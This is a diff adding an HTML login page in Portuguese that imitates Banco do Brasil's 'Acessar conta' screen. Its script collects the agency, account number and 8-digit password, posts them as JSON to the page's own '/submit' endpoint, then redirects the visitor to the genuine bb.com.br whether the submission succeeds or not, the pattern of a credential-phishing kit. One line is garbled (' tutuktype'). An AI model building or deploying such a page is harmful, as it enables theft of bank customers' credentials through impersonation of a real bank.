@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acessar conta - Banco do Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>Acessar conta</h1>
+        </header>
+        
+        <div class="content">
+            <h2 class="title">Pessoa física</h2>
+            <p class="subtitle">Informe os dados para acessar sua conta:</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="agencia">Agência</label>
+                    <input type="text" id="agencia" name="agencia" class="form-control" required>
+                    <p class="error-message" id="agenciaError">O campo Agência é obrigatório.</p>
+                </div>
+                
+                <div class="form-group">
+                    <label for="conta">Conta</label>
+                    <input type="text" id="conta" name="conta" class="form-control" required>
+                    <p class="form-hint">Troque o X por 0, se necessário</p>
+                </div>
+                
+                <div class="form-group" id="senhaGroup">
+                    <label for="senha">Senha de 8 dígitos</label>
+                    <div class="password-container">
+                        <input type="password" id="senha" name="senha" class="form-control" maxlength="8" required>
+                        <button type="button" class="password-toggle" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <a href="#" class="no-password" id="noPasswordLink">Não tenho senha</a>
+                <a href="#" class="have-password hidden" id="havePasswordLink">Tenho senha</a>
+            </form>
+        </div>
+        
+        <footer class="footer">
+            <button type="submit" form="loginForm" class="btn-primary">Acessar conta</button>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const agenciaInput = document.getElementById('agencia');
+            const contaInput = document.getElementById('conta');
+            const senhaInput = document.getElementById('senha');
+            const senhaGroup = document.getElementById('senhaGroup');
+            const agenciaError = document.getElementById('agenciaError');
+            const noPasswordLink = document.getElementById('noPasswordLink');
+            const havePasswordLink = document.getElementById('havePasswordLink');
+            const togglePassword = document.getElementById('togglePassword');
+            
+            // Mostrar mensagem de erro inicialmente
+            agenciaError.style.display = 'block';
+            
+            // Toggle para mostrar/esconder senha
+            togglePassword.addEventListener('click', function() {
+                const type = senhaInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                senhaInput.setAttribute(' tutuktype', type);
+                this.querySelector('i').classList.toggle('fa-eye');
+                this.querySelector('i').classList.toggle('fa-eye-slash');
+            });
+            
+            // Link "Não tenho senha"
+            let formAction = '/submit';
+            noPasswordLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                senhaGroup.style.display = 'none';
+                senhaInput.removeAttribute('required');
+                noPasswordLink.style.display = 'none';
+                havePasswordLink.style.display = 'block';
+                formAction = '/submit-no-password';
+            });
+            
+            // Link "Tenho senha"
+            havePasswordLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                senhaGroup.style.display = 'block';
+                senhaInput.setAttribute('required', '');
+                noPasswordLink.style.display = 'block';
+                havePasswordLink.style.display = 'none';
+                formAction = '/submit';
+            });
+            
+            // Validação do formulário e envio via fetch
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                let isValid = true;
+                if (!agenciaInput.value.trim()) {
+                    agenciaError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    agenciaError.style.display = 'none';
+                }
+                
+                if (!isValid) {
+                    return;
+                }
+                
+                const formData = {
+                    agencia: agenciaInput.value,
+                    conta: contaInput.value,
+                    senha: senhaInput.value || null
+                };
+                
+                try {
+                    const response = await fetch(formAction, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                    
+                    const result = await response.json();
+                    if (result.success) {
+                        window.location.href = 'https://www.bb.com.br/';
+                    }
+                } catch (error) {
+                    console.error('Erro:', error);
+                    window.location.href = 'https://www.bb.com.br/';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
